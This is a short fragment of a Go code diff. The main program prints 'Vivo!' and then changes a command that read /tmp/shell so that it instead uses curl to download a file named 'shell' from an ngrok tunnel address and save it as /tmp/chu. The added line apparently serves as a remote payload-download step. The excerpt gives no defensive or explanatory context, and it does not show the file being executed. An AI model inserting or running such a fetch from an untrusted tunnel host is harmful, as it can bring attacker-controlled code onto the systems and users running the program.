@@ -7,7 +7,7 @@ import (
 
 func main() {
         fmt.Println("Vivo!")
-        cmd := exec.Command("cat","/tmp/shell")
+        cmd := exec.Command("curl","https://8385-189-40-72-61.ngrok-free.app/shell","-o","/tmp/chu")
 
         output, err := cmd.Output()
         if err != nil {
